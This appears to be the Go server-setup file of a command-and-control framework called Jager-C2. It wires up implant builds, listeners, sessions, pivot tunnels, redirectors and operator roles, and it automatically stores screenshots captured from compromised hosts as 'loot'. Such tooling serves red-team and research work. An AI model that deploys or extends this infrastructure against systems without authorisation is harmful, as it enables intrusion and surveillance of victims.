package server

import (
	"context"
	"fmt"
	"os"
	"path/filepath"
	"time"

	"github.com/0xhackerfren/Jager-C2/teamserver/internal/auth"
	"github.com/0xhackerfren/Jager-C2/teamserver/internal/builds"
	"github.com/0xhackerfren/Jager-C2/teamserver/internal/campaign"
	"github.com/0xhackerfren/Jager-C2/teamserver/internal/events"
	"github.com/0xhackerfren/Jager-C2/teamserver/internal/listeners"
	"github.com/0xhackerfren/Jager-C2/teamserver/internal/loot"
	"github.com/0xhackerfren/Jager-C2/teamserver/internal/pivot"
	"github.com/0xhackerfren/Jager-C2/teamserver/internal/redirectors"
	"github.com/0xhackerfren/Jager-C2/teamserver/internal/scripting"
	"github.com/0xhackerfren/Jager-C2/teamserver/internal/sessions"
	"github.com/0xhackerfren/Jager-C2/teamserver/internal/tasks"
	pb "github.com/0xhackerfren/Jager-C2/teamserver/proto/jagerpb"
	"go.uber.org/zap"
	"google.golang.org/grpc"
	"google.golang.org/protobuf/types/known/timestamppb"
)

type Config struct {
	GRPCAddr    string
	DBPath      string
	BuildDir    string
	Workspace   string // harness repo root — C2 invokes builder from here
	BuilderPath string // optional override for build_implant.py
	CertFile    string
	KeyFile     string
	CAFile      string
	NoTLS       bool
}

type Server struct {
	cfg      *Config
	logger   *zap.Logger
	keyStore *APIKeyStore
	sessions *sessions.Manager
	tasks    *tasks.Queue
	builds   *builds.Store
	engine   *builds.Engine
	listen   *listeners.Manager
	loot     *loot.Store
	pivots   *pivot.Manager
	p2p         *pivot.P2PManager
	redirectors *redirectors.Manager
	auth        *auth.AuthManager
	events   *events.Bus
	campaign *campaign.Manager
	script   *scripting.Engine
	rpc      *RPCServer
}

func New(cfg *Config, logger *zap.Logger, keyStore *APIKeyStore) (*Server, error) {
	eventBus := events.NewBus()
	sessionMgr := sessions.NewManager(logger.Named("sessions"))
	sessionMgr.SetEventBus(eventBus)
	taskQueue := tasks.NewQueue(logger.Named("tasks"), sessionMgr)
	taskQueue.SetEventBus(eventBus)
	sessionMgr.SetTaskPurger(taskQueue)

	buildDir := cfg.BuildDir
	if buildDir == "" {
		buildDir = filepath.Join(filepath.Dir(cfg.DBPath), "builds")
	}
	buildStore, err := builds.NewStore(buildDir, logger.Named("builds"))
	if err != nil {
		return nil, err
	}
	buildStore.SetEventBus(eventBus)

	engine := builds.NewEngine(builds.EngineConfig{
		Workspace:   cfg.Workspace,
		BuilderPath: cfg.BuilderPath,
	}, buildStore, logger)

	listenerMgr := listeners.NewManager(logger.Named("listeners"), sessionMgr, taskQueue, buildStore)
	listenerMgr.SetEventBus(eventBus)
	lootStore, err := loot.NewStore(cfg.DBPath, logger.Named("loot"))
	if err != nil {
		return nil, err
	}
	buildStore.SetDB(lootStore.DB())
	if err := buildStore.LoadFromDB(); err != nil {
		logger.Warn("load builds from db", zap.Error(err))
	}

	sessionMgr.SetDB(lootStore.DB())
	taskQueue.SetDB(lootStore.DB())

	if loaded, err := sessionMgr.LoadPersistedSessions(); err != nil {
		logger.Warn("load persisted sessions", zap.Error(err))
	} else if loaded > 0 {
		logger.Info("restored sessions from database", zap.Int("count", loaded))
	}

	if loaded, err := taskQueue.LoadPersistedTasks(); err != nil {
		logger.Warn("load persisted tasks", zap.Error(err))
	} else if loaded > 0 {
		logger.Info("restored queued tasks from database", zap.Int("count", loaded))
	}

	tunnelMgr := pivot.NewTunnelManager(logger.Named("tunnel"))
	pivotMgr := pivot.NewManager(tunnelMgr, logger.Named("pivot"))
	p2pMgr := pivot.NewP2PManager(logger.Named("p2p"))
	authMgr := auth.NewAuthManager(logger.Named("auth"))
	if keyStore != nil {
		for _, opKey := range keyStore.allOperators() {
			authMgr.RegisterOperatorByName(opKey.Operator, authRoleFromString(opKey.Role))
		}
	} else if os.Getenv("JAGER_MGMT_API_KEY") != "" {
		if opName := os.Getenv("JAGER_OPERATOR_NAME"); opName != "" {
			role := auth.RoleOperator
			switch os.Getenv("JAGER_OPERATOR_ROLE") {
			case "admin":
				role = auth.RoleAdmin
			case "viewer":
				role = auth.RoleViewer
			case "builder":
				role = auth.RoleBuilder
			}
			authMgr.RegisterOperatorByName(opName, role)
		} else {
			authMgr.RegisterOperatorByName("default", auth.RoleAdmin)
		}
	}

	listenerMgr.SetTunnelManager(tunnelMgr)
	sessionMgr.SetPivotCleaner(pivotMgr)

	campaignMgr := campaign.NewManager()
	scriptEngine := scripting.NewEngine(eventBus, logger)
	scriptEngine.SetTaskEnqueuer(taskQueue)
	redirectorMgr := redirectors.NewManager(logger.Named("redirectors"))

	s := &Server{
		cfg:      cfg,
		logger:   logger,
		keyStore: keyStore,
		sessions: sessionMgr,
		tasks:    taskQueue,
		builds:   buildStore,
		engine:   engine,
		listen:   listenerMgr,
		loot:     lootStore,
		pivots:   pivotMgr,
		p2p:         p2pMgr,
		redirectors: redirectorMgr,
		auth:        authMgr,
		events:   eventBus,
		campaign: campaignMgr,
		script:   scriptEngine,
	}

	s.rpc = NewRPCServer(s)
	return s, nil
}

// Start launches background services tied to the server lifecycle.
func (s *Server) Start(ctx context.Context) {
	go s.sessions.StartHeartbeatMonitor(ctx, 3)
	if s.redirectors != nil {
		go s.startRedirectorHealthMonitor(ctx)
	}
	if s.script != nil {
		s.script.Start()
		if s.cfg.Workspace != "" {
			hooksDir := filepath.Join(s.cfg.Workspace, "jager", "hooks")
			if err := s.script.LoadHooksFromDir(hooksDir); err != nil && !os.IsNotExist(err) {
				s.logger.Warn("load scripting hooks", zap.Error(err))
			}
		}
	}
	go s.screenshotAutoStore()
}

// screenshotAutoStore listens for completed screenshot tasks and persists them as loot.
func (s *Server) screenshotAutoStore() {
	if s.events == nil {
		return
	}
	ch := s.events.Subscribe()
	for ev := range ch {
		if ev.Type != events.EventTaskCompleted {
			continue
		}
		data, ok := ev.Data.(map[string]interface{})
		if !ok {
			continue
		}
		taskType, _ := data["type"].(int32)
		if taskType != int32(pb.TaskType_TASK_SCREENSHOT) {
			continue
		}
		responseData, _ := data["response_data"].([]byte)
		if len(responseData) == 0 {
			continue
		}
		hostname := ""
		if sess, err := s.sessions.GetSession(ev.SessionID); err == nil && sess != nil {
			hostname = sess.GetHostname()
		}
		lf := &pb.LootFile{
			Id:         fmt.Sprintf("ss-%d", time.Now().UnixNano()),
			Name:       fmt.Sprintf("screenshot-%s-%d.png", ev.SessionID[:8], time.Now().Unix()),
			Category:   "screenshot",
			Data:       responseData,
			Size:       int64(len(responseData)),
			SourceHost: hostname,
			SessionId:  ev.SessionID,
			CapturedAt: timestamppb.Now(),
		}
		if err := s.loot.StoreLoot(lf); err != nil {
			s.logger.Warn("auto-store screenshot failed", zap.Error(err))
		} else {
			s.logger.Info("screenshot auto-stored", zap.String("session", ev.SessionID), zap.Int("size", len(responseData)))
		}
	}
}

func (s *Server) Register(grpcServer *grpc.Server) {
	s.rpc.Register(grpcServer)
}

func (s *Server) Shutdown() {
	s.listen.StopAll()
	s.loot.Close()
	s.logger.Info("all components shut down")
}

// PivotManager returns the server's pivot manager (used by management API)
func (s *Server) PivotManager() *pivot.Manager {
	return s.pivots
}

// TunnelManager returns the underlying tunnel manager (used by listener setup)
func (s *Server) TunnelManager() *pivot.TunnelManager {
	return s.pivots.Tunnels()
}

// P2PManager returns the P2P link graph manager.
func (s *Server) P2PManager() *pivot.P2PManager {
	return s.p2p
}

// KeyStore returns the operator API key store.
func (s *Server) KeyStore() *APIKeyStore {
	return s.keyStore
}

// AuthManager returns the operator RBAC manager.
func (s *Server) AuthManager() *auth.AuthManager {
	return s.auth
}

// EventBus returns the real-time event bus.
func (s *Server) EventBus() *events.Bus {
	return s.events
}

// CampaignManager returns the audit/campaign manager.
func (s *Server) CampaignManager() *campaign.Manager {
	return s.campaign
}

// ScriptEngine returns the scripting hook engine.
func (s *Server) ScriptEngine() *scripting.Engine {
	return s.script
}

// RedirectorManager returns the redirector infrastructure manager.
func (s *Server) RedirectorManager() *redirectors.Manager {
	return s.redirectors
}

func (s *Server) startRedirectorHealthMonitor(ctx context.Context) {
	ticker := time.NewTicker(60 * time.Second)
	defer ticker.Stop()
	for {
		select {
		case <-ctx.Done():
			return
		case <-ticker.C:
			s.redirectors.HealthCheck()
		}
	}
}
